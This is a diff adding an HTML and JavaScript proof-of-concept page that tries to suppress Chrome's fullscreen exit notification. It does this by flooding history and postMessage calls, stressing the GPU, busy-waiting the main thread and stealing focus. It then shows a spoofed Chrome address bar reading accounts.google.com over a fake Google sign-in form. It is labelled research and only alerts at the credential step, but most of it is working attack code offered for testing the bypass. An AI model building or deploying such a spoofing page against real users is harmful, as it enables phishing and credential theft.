@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Fullscreen Notification Bypass — Fixed PoC</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: system-ui, sans-serif; background: #0d1117; color: #e6edf3; }
+
+/* ── Attack launch UI ── */
+#launch-ui {
+  display: flex; flex-direction: column; align-items: center;
+  justify-content: center; min-height: 100vh; gap: 24px;
+}
+#launch-ui h1 { color: #f0883e; font-size: 20px; }
+#launch-ui p  { color: #8b949e; font-size: 13px; max-width: 480px; text-align: center; }
+
+.btn-launch {
+  padding: 18px 40px; font-size: 18px; font-weight: 700;
+  background: #238636; color: #fff; border: none; border-radius: 8px;
+  cursor: pointer; letter-spacing: 1px;
+}
+.btn-launch:hover { background: #2ea043; }
+.btn-launch:disabled { background: #444; cursor: default; }
+
+/* ── Measurement log ── */
+#log {
+  background: #161b22; border: 1px solid #30363d; border-radius: 6px;
+  padding: 12px 16px; font-family: monospace; font-size: 12px;
+  width: 520px; max-height: 180px; overflow-y: auto; color: #8b949e;
+}
+.ok  { color: #3fb950; }
+.err { color: #f85149; }
+.wrn { color: #e3b341; }
+
+/* ── Fake Google UI (shown when fullscreen) ── */
+#fake-ui {
+  display: none; position: fixed; inset: 0;
+  flex-direction: column; background: #f8f9fa; z-index: 999999;
+}
+/* Fake Chrome toolbar */
+#fake-toolbar {
+  background: #f1f3f4; border-bottom: 1px solid #dadce0;
+  height: 50px; display: flex; align-items: center; padding: 0 12px; gap: 10px;
+  flex-shrink: 0;
+}
+#fake-toolbar .nav { font-size: 20px; color: #5f6368; }
+#fake-toolbar .url-bar {
+  flex: 1; background: #fff; border: 1px solid #dadce0; border-radius: 20px;
+  padding: 6px 14px; display: flex; align-items: center; gap: 8px; font-size: 14px;
+}
+#fake-toolbar .lock { color: #188038; font-size: 16px; }
+#fake-toolbar .domain { color: #202124; }
+#fake-toolbar .more { font-size: 20px; color: #5f6368; margin-left: auto; }
+/* Fake page content */
+#fake-content {
+  flex: 1; display: flex; align-items: center; justify-content: center;
+  overflow: auto; padding: 40px;
+}
+.login-card {
+  background: #fff; border: 1px solid #dadce0; border-radius: 8px;
+  padding: 48px 40px; width: 100%; max-width: 420px;
+  box-shadow: 0 1px 3px rgba(60,64,67,.15), 0 4px 8px rgba(60,64,67,.1);
+}
+.login-card .google-logo { text-align: center; margin-bottom: 24px; }
+.login-card h2 { font-size: 24px; font-weight: 400; color: #202124; text-align: center; margin-bottom: 8px; }
+.login-card .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 24px; }
+.login-card input {
+  width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px;
+  font-size: 16px; margin-bottom: 16px; outline: none;
+}
+.login-card input:focus { border-color: #1a73e8; box-shadow: 0 0 0 2px rgba(26,115,232,.2); }
+.login-card .row { display: flex; justify-content: space-between; align-items: center; margin-top: 8px; }
+.login-card .forgot { color: #1a73e8; font-size: 14px; text-decoration: none; }
+.login-card .next-btn {
+  background: #1a73e8; color: #fff; border: none; border-radius: 4px;
+  padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer;
+}
+.login-card .next-btn:hover { background: #1557b0; }
+.poc-badge {
+  text-align: center; margin-top: 20px; font-size: 11px; color: #ea4335;
+  border: 1px solid #f28b82; border-radius: 4px; padding: 6px;
+}
+#exit-btn {
+  position: fixed; bottom: 16px; right: 16px;
+  background: rgba(0,0,0,.6); color: #fff; border: none; border-radius: 20px;
+  padding: 8px 18px; cursor: pointer; font-size: 13px; z-index: 9999999;
+}
+
+/* ── Timing display ── */
+#timer-overlay {
+  display: none; position: fixed; top: 0; left: 50%; transform: translateX(-50%);
+  background: rgba(0,0,0,.85); color: #0f0; font-family: monospace;
+  font-size: 22px; padding: 6px 20px; border-radius: 0 0 8px 8px; z-index: 9999999;
+}
+</style>
+</head>
+<body>
+
+<!-- ── Launch UI ── -->
+<div id="launch-ui">
+  <h1>Fullscreen Notification Bypass — PoC</h1>
+  <p>
+    Technique: IPC flood + GPU stress + main-thread busy-wait blocks notification render window.<br>
+    Based on CVE-2024-13178 (#40068607, $5K) — FoundIn Chrome 115. No public fix CL.<br>
+    Measures notification visibility time to determine if suppressed.
+  </p>
+
+  <button id="btn-launch" class="btn-launch">▶ LAUNCH (click = user gesture)</button>
+
+  <div id="log">Ready. Click LAUNCH to begin...<br></div>
+
+  <div style="color:#8b949e;font-size:12px;max-width:480px;text-align:center">
+    <strong style="color:#f0883e">What to observe:</strong>
+    If you see the fake Google login WITHOUT a "Press ESC" notification bar,
+    the bypass succeeded. If the notification is visible, it's patched.
+  </div>
+</div>
+
+<!-- ── Fake browser UI (shown in fullscreen) ── -->
+<div id="fake-ui">
+  <!-- Fake Chrome toolbar with spoofed URL -->
+  <div id="fake-toolbar">
+    <span class="nav">← → ↻</span>
+    <div class="url-bar">
+      <span class="lock">🔒</span>
+      <span class="domain">accounts.google.com</span>
+    </div>
+    <span class="more">⋮</span>
+  </div>
+  <!-- Fake Google login -->
+  <div id="fake-content">
+    <div class="login-card">
+      <div class="google-logo">
+        <svg width="75" height="24" viewBox="0 0 272 92">
+          <path fill="#4285F4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#EA4335" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+          <path fill="#FBBC05" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.6-13.08l8.48-3.53c1.51 3.61 5.21 7.87 11.12 7.87 7.27 0 11.8-4.49 11.8-12.958v-3.19h-.34c-2.18 2.69-6.38 5.04-11.69 5.04-11.1 0-21.25-9.66-21.25-22.09 0-12.52 10.15-22.27 21.25-22.27 5.3 0 9.5 2.35 11.69 4.96h.34v-3.61h9.28zm-8.59 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+          <path fill="#4285F4" d="M225 3v65h-9.5V3h9.5z"/>
+          <path fill="#34A853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.61 0-22.02-9.74-22.02-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.27c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.93-6.13zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+          <path fill="#EA4335" d="M35.29 41.41V32h31.77c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.03 9.66C16.32 69.35.36 53.89.36 35.29.36 16.69 16.32 1.23 35.1 1.23c10.49 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.29.05z"/>
+        </svg>
+      </div>
+      <h2>Sign in</h2>
+      <p class="subtitle">to continue to Google Account</p>
+      <input type="email" placeholder="Email or phone" id="fake-email">
+      <div class="row">
+        <a href="#" class="forgot">Forgot email?</a>
+        <button class="next-btn" onclick="showPassStep()">Next</button>
+      </div>
+      <div class="poc-badge">⚠ RESEARCH PoC — This is a spoofed page, NOT real Google</div>
+    </div>
+  </div>
+</div>
+
+<div id="timer-overlay">⏱ 0ms</div>
+<button id="exit-btn" style="display:none" onclick="exitFullscreen()">✕ Exit Demo</button>
+
+<!-- Hidden WebGL canvas for GPU stress -->
+<canvas id="gl-canvas" style="display:none" width="1" height="1"></canvas>
+
+<script>
+// ────────────────────────────────────────────────────────────────
+// MEASUREMENT
+// ────────────────────────────────────────────────────────────────
+const logEl    = document.getElementById('log');
+const timerEl  = document.getElementById('timer-overlay');
+let notifStart = null;
+let timerRaf   = null;
+
+function log(msg, cls) {
+  const span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
+  logEl.appendChild(span);
+  logEl.appendChild(document.createElement('br'));
+  logEl.scrollTop = logEl.scrollHeight;
+}
+
+function startTimer() {
+  notifStart = performance.now();
+  timerEl.style.display = 'block';
+  function tick() {
+    const ms = Math.round(performance.now() - notifStart);
+    timerEl.textContent = '⏱ Notification visible: ' + ms + 'ms';
+    timerRaf = requestAnimationFrame(tick);
+  }
+  timerRaf = requestAnimationFrame(tick);
+}
+
+function stopTimer() {
+  if (timerRaf) cancelAnimationFrame(timerRaf);
+  const ms = notifStart ? Math.round(performance.now() - notifStart) : 0;
+  timerEl.style.display = 'none';
+  return ms;
+}
+
+// ────────────────────────────────────────────────────────────────
+// GPU STRESS
+// ────────────────────────────────────────────────────────────────
+function startGPUStress(iterations) {
+  const canvas = document.getElementById('gl-canvas');
+  const gl = canvas.getContext('webgl');
+  if (!gl) { log('WebGL unavailable — skipping GPU stress', 'wrn'); return; }
+  const pixel = new Uint8Array([255, 0, 0, 255]);
+  for (let i = 0; i < iterations; i++) {
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, tex);
+    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 1, 1, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixel);
+  }
+  log('GPU stress: ' + iterations + ' textures created', 'ok');
+}
+
+// ────────────────────────────────────────────────────────────────
+// MESSAGE FLOOD — keeps browser event loop occupied
+// ────────────────────────────────────────────────────────────────
+let floodActive = false;
+function startMessageFlood() {
+  floodActive = true;
+  function flood() {
+    if (floodActive) {
+      window.postMessage('__flood__', '*');
+      setTimeout(flood, 0);
+    }
+  }
+  flood();
+}
+window.addEventListener('message', (e) => {
+  if (e.data !== '__flood__') return;
+  // Each handler blocks for 40ms — saturates event queue
+  const end = performance.now() + 40;
+  while (performance.now() < end) { /* busy */ }
+});
+
+// ────────────────────────────────────────────────────────────────
+// MAIN ATTACK
+// ────────────────────────────────────────────────────────────────
+const btnLaunch  = document.getElementById('btn-launch');
+const launchUI   = document.getElementById('launch-ui');
+const fakeUI     = document.getElementById('fake-ui');
+const exitBtn    = document.getElementById('exit-btn');
+
+let fsRequested = false;
+
+btnLaunch.onclick = function() {
+  if (fsRequested) return;
+  fsRequested = true;
+  btnLaunch.disabled = true;
+
+  log('User gesture received — starting attack chain...');
+
+  // ── Phase 1: IPC Flood BEFORE fullscreen request ──────────────
+  // Saturate browser↔renderer IPC channel
+  log('Phase 1: IPC flood (800 history mutations)...');
+  for (let i = 0; i < 800; i++) {
+    history.replaceState(null, '', '#' + Math.random());
+  }
+  log('IPC flood done', 'ok');
+
+  // ── Phase 2: GPU Stress ────────────────────────────────────────
+  startGPUStress(300);
+
+  // ── Phase 3: Request fullscreen (gesture still valid) ──────────
+  log('Phase 3: requestFullscreen({ navigationUI: "hide" })...');
+  const fsPromise = document.documentElement.requestFullscreen({ navigationUI: 'hide' });
+
+  // ── Wait for fullscreen confirmation, THEN block notification ───
+  // Busy-wait MUST be inside .then() — if run before, it blocks the
+  // browser↔renderer handshake and requestFullscreen() never resolves.
+  fsPromise.then(() => {
+    log('Fullscreen confirmed — starting notification suppression', 'ok');
+    startTimer();
+
+    // Phase 4: Busy-wait INSIDE .then() — blocks main thread during
+    // the notification render window (notification appears AFTER entry)
+    log('Phase 4: Busy-wait 700ms + layout pressure...');
+    const t0 = performance.now();
+    while (performance.now() - t0 < 700) {
+      history.replaceState(null, '', '#' + Math.random());
+      void document.body.offsetHeight;
+      void document.documentElement.scrollTop;
+    }
+    log('Busy-wait done: ' + Math.round(performance.now() - t0) + 'ms', 'ok');
+
+    // Phase 5: Focus stealing chain
+    function stealFocus() {
+      const inp = document.createElement('input');
+      inp.style.cssText = 'position:fixed;top:-9999px';
+      document.body.appendChild(inp);
+      inp.focus();
+      inp.remove();
+      Promise.resolve().then(() => { if (floodActive) stealFocus(); });
+    }
+    stealFocus();
+
+    // Phase 6: Message flood
+    startMessageFlood();
+    log('Phase 5+6: Focus stealing + message flood active', 'ok');
+
+    showFakeUI();
+  }).catch(err => {
+    log('requestFullscreen() FAILED: ' + err.message, 'err');
+    fsRequested = false;
+    btnLaunch.disabled = false;
+    floodActive = false;
+  });
+};
+
+// ────────────────────────────────────────────────────────────────
+// UI SWITCHING
+// ────────────────────────────────────────────────────────────────
+function showFakeUI() {
+  launchUI.style.display = 'none';
+  fakeUI.style.display   = 'flex';
+  exitBtn.style.display  = 'block';
+
+  // Auto-focus email field (makes fake page feel real)
+  setTimeout(() => {
+    document.getElementById('fake-email').focus();
+  }, 100);
+
+  log('Fake UI visible. Check: is "Press ESC" notification visible above?', 'wrn');
+}
+
+function showPassStep() {
+  alert('PoC: In real attack, credentials captured here.\nNotification suppressed = user had no warning.');
+}
+
+function exitFullscreen() {
+  floodActive = false;
+  fsRequested = false;
+  const ms = stopTimer();
+  log('Exiting — notification was visible for ~' + ms + 'ms', 'wrn');
+  log('RESULT: ' + (ms < 500 ? 'BYPASS LIKELY — notification suppressed (<500ms)' : 'PATCHED — notification visible ' + ms + 'ms'), ms < 500 ? 'ok' : 'err');
+
+  if (document.fullscreenElement) document.exitFullscreen();
+  fakeUI.style.display   = 'none';
+  launchUI.style.display = 'flex';
+  exitBtn.style.display  = 'none';
+  btnLaunch.disabled     = false;
+  fsRequested            = false;
+}
+
+document.addEventListener('fullscreenchange', () => {
+  if (!document.fullscreenElement) {
+    floodActive = false;
+    const ms = stopTimer();
+    if (ms > 0) {
+      log('Fullscreen exited (ESC pressed) — notification visible: ' + ms + 'ms',
+          ms < 500 ? 'ok' : 'err');
+    }
+    fakeUI.style.display   = 'none';
+    launchUI.style.display = 'flex';
+    exitBtn.style.display  = 'none';
+    btnLaunch.disabled     = false;
+    fsRequested            = false;
+  }
+});
+
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'Escape') exitFullscreen();
+});
+</script>
+</body>
+</html>
